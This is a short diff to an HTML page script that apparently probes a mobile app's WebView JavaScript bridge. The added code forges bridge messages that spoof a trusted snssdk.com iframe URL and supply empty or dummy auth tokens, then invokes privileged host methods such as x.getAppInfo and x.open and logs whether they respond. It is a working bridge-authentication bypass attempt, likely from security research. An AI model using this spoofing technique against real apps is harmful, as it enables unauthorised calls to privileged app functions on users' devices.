@@ -62,7 +62,36 @@ function fire(name) {
   } catch (e) { log("sync " + name + " err=" + e); }
 }
 methods.forEach(fire);
-setTimeout(function () { log("done"); }, 4000);
+
+var SPOOF_IFRAME = "https://reading.snssdk.com/reading_offline/drlazy/page/general-rules.html";
+function fireSpoof(name, token) {
+  if (!b || !b._invokeMethod) { log("spoof " + name + " tok=" + JSON.stringify(token) + " no-inv"); return; }
+  var tokTag = token === "" ? "empty" : String(token);
+  var payload = {
+    func: name,
+    params: {},
+    __callback_id: "cb_spoof_" + name.replace(/\./g, "_") + "_tok" + tokTag,
+    __msg_type: "callback",
+    JSSDK: "1",
+    namespace: "host",
+    appID: 8662,
+    __iframe_url: SPOOF_IFRAME,
+    __bridgeAuthToken: token
+  };
+  try {
+    var r = b._invokeMethod(JSON.stringify(payload));
+    log("spoof " + name + " tok=" + JSON.stringify(token) + " ret=" + JSON.stringify(r));
+  } catch (e) {
+    log("spoof " + name + " tok=" + JSON.stringify(token) + " err=" + e);
+  }
+}
+log("spoof_begin iframe=" + SPOOF_IFRAME);
+["x.getAppInfo", "x.open"].forEach(function (name) {
+  fireSpoof(name, "");
+  fireSpoof(name, "1");
+});
+log("spoof_sent");
+setTimeout(function () { log("done"); }, 5000);
 </script>
 </body>
 </html>
